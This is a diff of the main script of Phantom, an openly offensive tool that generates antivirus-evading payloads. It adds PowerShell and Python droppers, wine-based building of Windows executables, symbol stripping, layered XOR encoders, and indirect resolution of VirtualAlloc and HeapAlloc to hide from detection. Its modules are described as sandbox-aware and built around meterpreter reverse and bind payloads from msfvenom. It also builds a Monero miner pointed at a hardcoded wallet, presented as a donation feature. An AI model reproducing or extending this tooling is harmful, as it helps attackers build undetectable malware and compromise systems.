@@ -77,6 +77,8 @@ def linux_isready():
         auto_check("msfvenom")
         auto_check("msfconsole")
         auto_check("openssl")
+        auto_check("strip")
+        auto_check("wine")
         print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
         sleep(1)
     else:
@@ -108,9 +110,19 @@ def kali_arch_isready():
     auto_setup("msfvenom")
     auto_setup("msfconsole")
     auto_setup("openssl")
+    auto_setup("strip")
+    auto_setup("wine")    
     xmr_folder=os.path.isdir("Setup/Donate")
     if xmr_folder == False:
+        sleep(0.5)
+        print(bcolors.OCRA + "[>] Xmr-stak setup:\n" + bcolors.ENDC)
         xmr_setup()
+    if wine_fastcheck() == True:
+        sleep(0.2)
+        print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
+        sleep(0.5)
+    else:       
+        wine_check()
 
     print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
     sleep(1)
@@ -135,10 +147,20 @@ def ubuntu_isready():
     auto_setup("pyinstaller")
     auto_setup("zipalign")
     auto_setup("openssl")
-
+    auto_setup("strip")
+    auto_setup("wine")
+    wine_check() 
     xmr_folder=os.path.isdir("Setup/Donate")
     if xmr_folder == False:
+        sleep(0.5)
+        print(bcolors.OCRA + "[>] Xmr-stak setup:\n" + bcolors.ENDC)
         xmr_setup()
+    if wine_fastcheck() == True:
+        sleep(0.2)
+        print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
+        sleep(0.5)
+    else:       
+        wine_check()
 
     try:
         is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
@@ -240,6 +262,72 @@ def dependencies_checker():
 
         pass
 
+def strip_tease(Filename):
+    subprocess.call(['strip',Filename])
+
+def wine_fastcheck():
+    wine=False
+    wineok = open("Setup/Donate/Config.txt","r")
+    for line in wineok:
+        if "WinEnv = OK" in line:
+            wine=True
+    return wine
+   
+
+def wine_check():
+    FLAG1=""
+    FLAG2=""
+    print(bcolors.OCRA + bcolors.BOLD + "[+] Wine Environment check" + bcolors.ENDC + bcolors.ENDC)
+    try:
+        py_check=subprocess.check_output(['wine','python','-v'],stderr=subprocess.STDOUT)
+
+    except subprocess.CalledProcessError: 
+        print(bcolors.RED + bcolors.BOLD + "[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
+        print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil Evasion to automatically setup Wine environment\n")
+        sleep(5) 
+        
+        
+    else:
+        if "cannot find" in py_check:
+            print(bcolors.RED + bcolors.BOLD + "[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
+            print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil Evasion to automatically setup Wine environment\n")
+            sleep(5)
+        else:
+
+            print(bcolors.GREEN + "[Wine] Python Found" + bcolors.ENDC)
+            FLAG1="OK"
+            
+    try:
+        pyin_check=subprocess.check_output(['wine','pyinstaller','-v'],stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError: 
+        print(bcolors.RED + bcolors.BOLD + "[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
+        print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil to automatically setup Wine environment \n")
+        sleep(5) 
+        
+
+    else:
+        if "cannot find" in pyin_check:
+            print(bcolors.RED + bcolors.BOLD + "[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
+            print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil to automatically setup Wine environment\n")
+            sleep(5) 
+
+        else:
+
+            print(bcolors.GREEN + "[Wine] Pyinstaller Found" + bcolors.ENDC )
+            FLAG2="OK"        
+    sleep(0.5)
+
+    if FLAG1=="OK":
+        if FLAG2=="OK":
+                new_conf=""
+                wineok = open("Setup/Donate/Config.txt","r")
+                for line in wineok:
+                    new_conf += line
+                new_conf += "WinEnv = OK"
+                with open("Setup/Donate/Config.txt", "w") as conf:
+                    conf.write(new_conf)
+
+
 def xmr_setup():
     os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
     username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))
@@ -253,7 +341,7 @@ def xmr_setup():
     miner_config2 = ""
     miner_config2 += "\"pool_list\" :\n"
     miner_config2 += "[\n"
-    miner_config2 += "	{\"pool_address\" : \"gulf.moneroocean.stream:10002\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
+    miner_config2 += "	{\"pool_address\" : \"gulf.moneroocean.stream:10001\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
     miner_config2 += "],\n"
     miner_config2 += "\"currency\" : \"monero\",\n"
     miner_config2 += "\"call_timeout\" : 10,\n"
@@ -285,6 +373,10 @@ def xmr_setup():
 
     elif multiprocessing.cpu_count() == 4:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+
+    elif multiprocessing.cpu_count() == 6:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
 
     elif multiprocessing.cpu_count() == 8:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
@@ -319,13 +411,13 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.2 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "12\n")
+    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "17\n")
     sleep(0.2)
     print(bcolors.RED + "[+] INTEGRATED XMR-MINER: " + bcolors.ENDC + "See Readme Donate Section \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Powershell payload & custom encoder \n")
+    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Indirect call,Wine-pyinstaller payload & new encoders \n")
   
 
     sleep(3)
@@ -367,13 +459,32 @@ def exit_banner():
     print("         ,... : ;                | 31/10/2017|                               ")
     print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 
 
+def python_sys_completer(wine):
+    clear()
+    py_version=platform.python_version()
+    print(bcolors.OCRA + "[Python dropper]"  + bcolors.ENDC + " Choose how to supply commandline payload:\n")
+    print("[1] Custom commandline payload\n")
+    print("[0] Back\n")
+    if py_version[0] == "3":
+        ans=input("\n[>] Please insert choice\'s number: ")
+    else:
+        ans=raw_input("\n[>] Please insert choice\'s number: ") 
+    if ans == "1":
+        if py_version[0] == "3": 
+            ans=input("\n[>]  Insert oneline payload: ")
+        else:
+            ans=raw_input("\n[>]  Insert oneline payload: ")
+
+        pytherpreter_launcher(ans,"Python_Polymorphic_Powershelloneline",wine)
+
+
 def xmr_miner():
 
     subprocess.call(['tmux','send-keys','-t','phantom-miner','\"\x03\"','C-m'], stdout=open(os.devnull,'wb'), stderr=open(os.devnull,'wb'))
     sleep(0.25)
     os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 
 
-def pytherpreter_completer(module_type):
+def pytherpreter_completer(module_type,wine):
     clear()
     print(bcolors.OCRA + "\n[<Pytherpreter>] choose meterpreter payload:\n\n"  + bcolors.ENDC)
     print("[+] python/meterpreter/reverse_tcp\n")
@@ -400,7 +511,7 @@ def pytherpreter_completer(module_type):
             Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport],shell=True)
         else:
             Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport])
-        pytherpreter_launcher(Paytime,module_type)
+        pytherpreter_launcher(Paytime,module_type,wine)
 
     elif "bind" in ans:
  
@@ -421,10 +532,10 @@ def pytherpreter_completer(module_type):
 
             Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Rhost,Rport])
 
-        pytherpreter_launcher(Paytime,module_type)
+        pytherpreter_launcher(Paytime,module_type,wine)
     
 
-def pytherpreter_launcher(rec_Payload,module_type):
+def pytherpreter_launcher(rec_Payload,module_type,wine):
     generated_pyth=str(rec_Payload)
     py_version=platform.python_version()
 
@@ -443,7 +554,11 @@ def pytherpreter_launcher(rec_Payload,module_type):
 
         elif module_type == "Pytherpreter_Polymorphic":
 
-            subprocess.call(['python','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename])
+            subprocess.call(['python','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename,wine])
+
+        elif module_type == "Python_Polymorphic_Powershelloneline":
+
+            subprocess.call(['python','Modules/payloads/Python_Polymorphic_Powershelloneline.py',generated_pyth,Filename,wine])
         
     elif platform.system() == "Windows":
 
@@ -453,38 +568,71 @@ def pytherpreter_launcher(rec_Payload,module_type):
 
         elif module_type == "Pytherpreter_Polymorphic":
 
-            subprocess.call(['py','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename])
+            subprocess.call(['py','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename,wine])
 
-    auto_pyinstall(Filename)   
+        elif module_type == "Python_Polymorphic_Powershelloneline":
 
-def auto_pyinstall(filename):
+            subprocess.call(['py','Modules/payloads/Python_Polymorphic_Powershelloneline.py',generated_pyth,Filename,wine])
+
+    auto_pyinstall(Filename,wine)   
+
+def auto_pyinstall(filename,wine):
     py_version=platform.python_version()
+    if wine == False:
+        if py_version[0] == "3": 
+            ans=input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
+        else:
+            ans=raw_input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
 
-    if py_version[0] == "3": 
-        ans=input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
+        if ans == "y":
+            if platform.system() == "Linux":
+                subprocess.call(['pyinstaller','--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
+            
+            elif platform.system() == "Windows":
+                path2pyinstaller=path_finder("pyinstaller.py")
+                subprocess.call(['py',path2pyinstaller,'--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
+
+            sleep(2)  
+
+            filename=filename.replace(".py",".exe")
+            bwd=str("dist/" + filename)
+            sleep(1)
+            os.rename(bwd,filename)
+            rmtree("build")
+            os.remove(filename + ".spec")
+            os.rmdir("dist")
+            sleep(0.5) 
+            print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC) 
+            sleep(3)
+  
+        else:
+            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder\n"  + bcolors.ENDC)
+            sleep(3)
+
+
     else:
-        ans=raw_input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
 
-    if ans == "y":
         if platform.system() == "Linux":
-            subprocess.call(['pyinstaller',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
+
+            subprocess.call(['wine','pyinstaller','--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
+
             
         elif platform.system() == "Windows":
             path2pyinstaller=path_finder("pyinstaller.py")
-            subprocess.call(['py',path2pyinstaller,filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
+            subprocess.call(['py',path2pyinstaller,'--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
             
         sleep(1)  
-        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC)
-        filename=filename.replace(".py","")
+        filename=filename.replace(".py",".exe")
         bwd=str("dist/" + filename)
         os.rename(bwd,filename)
         rmtree("build")
+        filename=filename.replace(".exe","")
         os.remove(filename + ".spec")
-        os.rmdir("dist")  
+        os.rmdir("dist")
+        sleep(0.5) 
+        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC)   
         sleep(3)  
-    else:
-        print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder\n"  + bcolors.ENDC)
-        sleep(3)
+
 
 def menu_options():
     print("    ====================================================================")
@@ -494,7 +642,7 @@ def menu_options():
     print("  ||                                 ||                                 || ")
     print("  ||    [2]  List Windows modules    ||   [6]  List Universal modules   || ")
     print("  ||                                 ||                                 || ")
-    print("  ||    [3]  List Linux modules      ||   [7]  Update                   || ")
+    print("  ||    [3]  List Linux modules      ||   [7]  Update check             || ")
     print("  ||                                 ||                                 || ")
     print("  ||    [4]  List OSX modules        ||   [0]  Exit                     || ")
     print("  ||                                 ||                                 || ")
@@ -606,6 +754,8 @@ def auto_compiler(module_type,arch,filename):
 
             subprocess.call(['gcc','Source.c','-lm','-o',filename,'-static'])
 
+        strip_tease(filename)
+
     elif Os_used == "Windows":
 
         if "windows" in module_type and arch == "x86":
@@ -634,6 +784,7 @@ def shellcode_options():
     print(bcolors.OCRA + "[<Payload>] choose how to supply shellcode:\n\n" + bcolors.ENDC)
     print("[1] Msfvenom\n")
     print("[2] Custom shellcode\n")
+    print("[0] Back\n")
     if py_version[0] == "3":
         ans=input("\n[>] Please insert choice\'s number: ")
     else:
@@ -669,9 +820,10 @@ def module_launcher1(module_choice):
         Arc = "x64"
         print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
         sleep(0.2)
-        print("[1] x64/xor (average)\n")
-        print("[2] x64/xor + Multibyte xor c stub (excellent)\n")
-
+        print("[1] x64/xor                                    (average)\n")
+        print("[2] x64/xor + Multibyte xor                       (good)\n")
+        print("[3] x64/xor + Double Multibyte-key xor trap  (excellent)\n")
+        print("[4] x64/xor + Triple Multibyte-key xor trap  (excellent)\n")
 
     else:
 
@@ -679,8 +831,10 @@ def module_launcher1(module_choice):
         Arc = "x86"
         print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
         sleep(0.2)
-        print("[1] x86/shikata_ga_nai (good)\n")
-        print("[2] x86/shikata_ga_nai + Multibyte xor c stub (excellent)\n")
+        print("[1] x86/shikata_ga_nai                                   (average)\n")
+        print("[2] x86/shikata_ga_nai + Multibyte-key xor                  (good)\n")
+        print("[3] x86/shikata_ga_nai + Double Multibyte-key xor trap (excellent)\n")
+        print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor trap (excellent)\n")
 
     if py_version[0] == "3":
 
@@ -703,6 +857,14 @@ def module_launcher1(module_choice):
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5)
+
+    if enc_type == "3":
+        print(bcolors.GREEN + "\n[>] Double-key Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5)
+
+    if enc_type == "4":
+        print(bcolors.GREEN + "\n[>] Triple-key Xor multibyte encoding...\n" + bcolors.ENDC)
         sleep(0.5) 
 
     if platform.system() == "Linux":
@@ -736,8 +898,10 @@ def module_launcher2(module_choice):
 
     print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
     sleep(0.2)
-    print("[1] None\n")
-    print("[2] MultibyteKey xor c stub (excellent)\n")
+    print("[1] None                                (none)\n")
+    print("[2] MultibyteKey xor                    (good)\n")
+    print("[3] Double Multibyte-key xor trap  (excellent)\n")
+    print("[4] Triple Multibyte-key xor trap  (excellent)\n")
 
     if py_version[0] == "3":
 
@@ -786,6 +950,7 @@ def powershell_options(module_type):
         print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
         print("[1] Msfvenom powershell payload\n")
         print("[2] Custom powershell file\n")
+        print("[0] Back\n")
 
     if module_type == "2":
         print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
@@ -888,19 +1053,21 @@ def powershell_launcher1(module_choice):
 def powershell_launcher2(module_choice):
     py_version=platform.python_version()
     if py_version[0] == "3":
-        if module_choice == "Polymorphic_PowershellScriptDropper_windows.py":
+        if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):
             powershell_payload = ""
             path2psfile = input("\n[>] Please enter the path of the powershell script: ")
             powershellfile = open(path2psfile, "r")
             for line in powershellfile:
                 powershell_payload += line
     
-        if module_choice == "Polymorphic_PowershellOnelineDropper_windows.py":
+        if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):
+
             powershell_payload = input("\n[>] Please enter powershell oneline payload: ")
+
         output_filename = input("\n[>] Enter output filename: ")
         arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
     else:
-        if module_choice == "Polymorphic_PowershellScriptDropper_windows.py":
+        if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):
             powershell_payload = ""
             path2psfile = raw_input("\n[>] Please enter the path of the powershell script: ")
             powershellfile = open(path2psfile, "r")
@@ -908,8 +1075,10 @@ def powershell_launcher2(module_choice):
                 powershell_payload += line
     
 
-        if module_choice == "Polymorphic_PowershellOnelineDropper_windows.py":
+        if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):
+
             powershell_payload = raw_input("\n[>] Please enter powershell oneline payload: ")
+
         output_filename = raw_input("\n[>] Enter output filename: ")
         arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
 
@@ -1167,43 +1336,8 @@ def droidmare_launcher():
 def description_printer(module_type):
     print("\n[+] MODULE DESCRIPTION:\n") 
     
-    if module_type == "MVA_mathinject_windows.py":
-        description = ""
-        description += "  This Module use static multipath technique to forge\n"
-        description += "  Windows dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
-        description += "  [>] Memory allocation type: VIRTUAL\n\n"
-        description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + multibyte-key xor c stub \n"
-        description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Resource consumption technique\n"
-        description += "  Sandbox-aware code \n"
-        description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"
 
-    elif module_type == "MHA_mathinject_windows.py":
-        description = ""
-        description += "  This Module use static multipath technique to forge\n"
-        description += "  Windows dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
-        description += "  [>] Memory allocation type: HEAP\n\n"
-        description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + multibyte-key xor c stub \n"
-        description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Resource consumption technique\n"
-        description += "  Sandbox-aware code \n"
-        description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"
-
-    elif module_type == "Polymorphic_MVA_mathinject_windows.py":
+    if module_type == "Polymorphic_MVA_mathinject_windows.py":
         description = ""
         description += "  This Module use polymorphic multipath technique to forge\n"
         description += "  Windows dropper written in c able to avoid \n"
@@ -1212,10 +1346,14 @@ def description_printer(module_type):
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
         description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
-        description += "  32bit ENCODER avaiable: \n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
         description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + multibyte-key xor c stub \n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
@@ -1230,10 +1368,102 @@ def description_printer(module_type):
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
         description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
-        description += "  32bit ENCODER avaiable: \n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
         description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + multibyte-key xor c stub \n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py":
+        description = ""
+        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime VirtualAlloc \n"
+        description += "  without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "Polymorphic_MVA_NDC_GPAGMH_mathinject_windows.py":
+        description = ""
+        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime VirtualAlloc \n"
+        description += "  without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "Polymorphic_MHA_NDC_LLGPA_mathinject_windows.py":
+        description = ""
+        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime HeapCreate and \n"
+        description += "  HeapAlloc without direct call\n\n"
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "Polymorphic_MHA_NDC_GPAGMH_mathinject_windows.py":
+        description = ""
+        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime HeapCreate and \n"
+        description += "  HeapAlloc without direct call\n\n"
+        description += "  [>] Memory allocation type: HEAP\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
@@ -1272,10 +1502,14 @@ def description_printer(module_type):
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
         description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
-        description += "  32bit ENCODER avaiable: \n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
         description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + multibyte-key xor c stub \n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
@@ -1288,9 +1522,16 @@ def description_printer(module_type):
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  ENCODER avaiable: \n"
-        description += "  [1] Shikata_ga_nai (good) \n"
-        description += "  [2] Shikata_ga_nai + Multibyte xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
+        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
+        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
+        description += "  64bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + Multibyte xor\n"
+        description += "  [3] x64/xor + Double-key multibyte xor\n"
+        description += "  [4] x64/xor + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  What is my name technique \n"
         description += "  Resource consumption technique\n"
@@ -1314,8 +1555,23 @@ def description_printer(module_type):
 
         description = ""
         description += "  This Module use python metasploit payloads to forge\n"
-        description += "  executable (for the platform that launch this module) able to \n"
+        description += "  executable able to \n"
